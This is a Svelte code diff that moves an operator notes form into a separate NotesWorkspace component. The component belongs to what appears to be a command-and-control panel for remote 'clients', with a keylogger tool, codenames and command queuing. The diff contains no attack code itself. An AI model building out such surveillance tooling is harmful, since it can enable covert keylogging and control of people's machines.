@@ -32,6 +32,7 @@
 	} from '$lib/data/client-tool-workspaces';
 	import { notifyToolActivationCommand } from '$lib/utils/agent-commands.js';
 	import KeyloggerWorkspace from '$lib/components/workspace/tools/keylogger-workspace.svelte';
+	import NotesWorkspace from '$lib/components/workspace/tools/notes-workspace.svelte';
 	import SystemInformationDialog from '$lib/components/system-information-dialog.svelte';
 	import { ShieldCheck, TriangleAlert } from '@lucide/svelte';
 	import type {
@@ -71,78 +72,6 @@
 	function handleFormSubmit(event: SubmitEvent) {
 		event.preventDefault();
 		requestClose();
-	}
-
-	function parseTags(input: string): string[] {
-		return input
-			.split(/[,\s]+/)
-			.map((tag) => tag.trim())
-			.filter(Boolean);
-	}
-
-	function clearNoteFeedback() {
-		noteSaveError = null;
-		noteSaveSuccess = null;
-	}
-
-	async function handleNotesSubmit(event: SubmitEvent) {
-		event.preventDefault();
-
-		noteSaveError = null;
-		noteSaveSuccess = null;
-
-		if (!browser) {
-			noteSaveError = 'Notes cannot be saved in this environment';
-			return;
-		}
-
-		const trimmed = noteText.trimEnd();
-		const tags = parseTags(noteTagsInput);
-
-		noteSavePending = true;
-
-		try {
-			const response = await fetch(`/api/agents/${client.id}/notes`, {
-				method: 'POST',
-				headers: { 'Content-Type': 'application/json' },
-				body: JSON.stringify({ note: trimmed, tags })
-			});
-
-			if (!response.ok) {
-				const message = (await response.text())?.trim();
-				noteSaveError = message || 'Failed to save notes';
-				return;
-			}
-
-			let responseBody: unknown = null;
-			try {
-				responseBody = await response.json();
-			} catch {
-				responseBody = null;
-			}
-
-			let nextNote = trimmed;
-			if (responseBody && typeof (responseBody as Record<string, unknown>).note === 'string') {
-				const received = (responseBody as { note: string }).note ?? '';
-				nextNote = received.trimEnd();
-			}
-
-			let nextTags = tags;
-			if (responseBody && Array.isArray((responseBody as Record<string, unknown>).tags)) {
-				nextTags = (responseBody as { tags: unknown[] }).tags
-					.map((tag) => `${tag}`.trim())
-					.filter(Boolean);
-			}
-
-			noteText = nextNote;
-			client.notes = nextNote;
-			noteTagsInput = nextTags.join(' ');
-			noteSaveSuccess = 'Notes saved';
-		} catch (err) {
-			noteSaveError = err instanceof Error ? err.message : 'Failed to save notes';
-		} finally {
-			noteSavePending = false;
-		}
 	}
 
 	const tool = getClientTool(toolId);
@@ -198,11 +127,6 @@
 	const selectClasses =
 		'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-sm shadow-xs ring-offset-background transition-[color,box-shadow] outline-none disabled:cursor-not-allowed disabled:opacity-50 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 dark:bg-input/30';
 
-	let noteText = $state(client.notes ?? '');
-	let noteTagsInput = $state(client.tags?.join(' ') ?? '');
-	let noteSavePending = $state(false);
-	let noteSaveError = $state<string | null>(null);
-	let noteSaveSuccess = $state<string | null>(null);
 	let url = $state('https://');
 	let urlContext = $state('');
 	let messageTitle = $state('');
@@ -215,7 +139,6 @@
 	let openUrlAudit = $state<CommandQueueAuditRecord | null>(null);
 	let openUrlComplete = $state(false);
 
-	const notesFieldId = `client-${client.id}-notes`;
 	const openUrlFieldId = `client-${client.id}-open-url`;
 	const openUrlContextId = `client-${client.id}-open-url-context`;
 	const messageTitleId = `client-${client.id}-message-title`;
@@ -434,50 +357,15 @@
 					{:else if toolId === 'system-info'}
 						<SystemInformationDialog {client} />
 					{:else if toolId === 'notes'}
-						<form class="flex h-full flex-col" onsubmit={handleNotesSubmit}>
-							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
-								<div class="grid gap-2">
-									<Label for={notesFieldId}>Operational notes</Label>
-									<Textarea
-										id={notesFieldId}
-										class="min-h-32"
-										bind:value={noteText}
-										on:input={clearNoteFeedback}
-										placeholder="Add context, requirements, or follow-up actions for {client.codename}."
-									/>
-								</div>
-								<div class="grid gap-2">
-									<Label for={`${notesFieldId}-tags`}>Quick tags</Label>
-									<Input
-										id={`${notesFieldId}-tags`}
-										bind:value={noteTagsInput}
-										on:input={clearNoteFeedback}
-										placeholder="intel priority staging"
-									/>
-								</div>
-								{#if noteSaveError}
-									<p class="text-sm text-destructive">{noteSaveError}</p>
-								{:else if noteSaveSuccess}
-									<p class="text-sm text-emerald-600">{noteSaveSuccess}</p>
-								{/if}
-							</div>
-							<div
-								class="flex items-center justify-end gap-2 border-t border-border/70 bg-muted/30 px-6 py-4"
-							>
+						<NotesWorkspace {client}>
+							<svelte:fragment slot="secondary" let:noteSavePending>
 								<Dialog.Close>
 									{#snippet child({ props })}
-										<Button variant="outline" {...props}>Cancel</Button>
+										<Button variant="outline" disabled={noteSavePending} {...props}>Cancel</Button>
 									{/snippet}
 								</Dialog.Close>
-								<Button type="submit" disabled={noteSavePending}>
-									{#if noteSavePending}
-										Saving…
-									{:else}
-										Save draft
-									{/if}
-								</Button>
-							</div>
-						</form>
+							</svelte:fragment>
+						</NotesWorkspace>
 					{:else if toolId === 'open-url'}
 						<form class="flex h-full flex-col" onsubmit={handleOpenUrlSubmit}>
 							<div class="flex-1 space-y-6 overflow-auto px-6 py-5">
